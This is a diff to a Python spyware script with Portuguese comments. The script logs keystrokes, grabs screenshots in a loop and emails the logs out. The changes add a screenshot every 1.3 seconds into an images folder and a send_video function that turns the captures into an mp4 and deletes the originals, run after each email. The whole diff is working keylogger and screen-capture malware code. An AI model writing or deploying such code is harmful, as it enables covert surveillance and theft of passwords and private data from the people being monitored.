@@ -9,16 +9,34 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import os
+from moviepy.editor import *
 
 fullog = ''
 words = ''
+email_char_limit = 60
 
 # Lista para armazenar os nomes dos arquivos de screenshot
 screenshot_files = []
 
 # Dicionário de substituição para caracteres acentuados
 substitutions = {
+    "39": "á",
+    "ey.cmey": "pressionou: alt+tab ",
 }
+
+# Caminho para salvar as imagens
+images_folder = "images"
+
+# Verifica se a pasta existe, se não, cria a pasta
+if not os.path.exists(images_folder):
+    os.makedirs(images_folder)
+
+# Caminho para salvar os videos
+videos_folder = "videos"
+
+# Verifica se a pasta existe, se não, cria a pasta
+if not os.path.exists(videos_folder):
+    os.makedirs(videos_folder)
 
 
 def on_press(key):
@@ -61,7 +79,9 @@ def replace_characters(text):
 
 def capture_screenshot():
     while True:
+        time.sleep(1.3)
         screenshot = ImageGrab.grab()
+        filename = os.path.join(images_folder, f"screenshot_{int(time.time())}.png")
         screenshot.save(filename)
         screenshot_files.append(filename)
 
@@ -96,9 +116,39 @@ def send_log():
         s.quit()
         print('Email enviado')
 
+        send_video()
 
     except Exception as e:
         print(f"Erro ao enviar email: {e}")
+
+
+def send_video():
+    try:
+        # Pegando imagens
+        image_files = sorted(
+            [
+                os.path.join(images_folder, img)
+                for img in os.listdir(images_folder)
+                if img.endswith(".png")
+            ]
+        )
+
+        if len(image_files) > 0:
+            # Cria video com imagens da pasta images
+            clip = ImageSequenceClip(image_files, fps=1)
+            video_filename = os.path.join(videos_folder, "screenshot_video.mp4")
+            clip.write_videofile(video_filename, codec='libx264')
+            print(f"Vídeo criado: {video_filename}")
+
+            # Limpa as imagens após criar o vídeo
+            for img in image_files:
+                os.remove(img)
+
+        else:
+            print("Nenhuma imagem encontrada para criar o vídeo")
+
+    except Exception as e:
+        print(f"Erro ao criar o vídeo: {e}")
 
 # Start the screenshot thread
 screenshot_thread = threading.Thread(target=capture_screenshot)
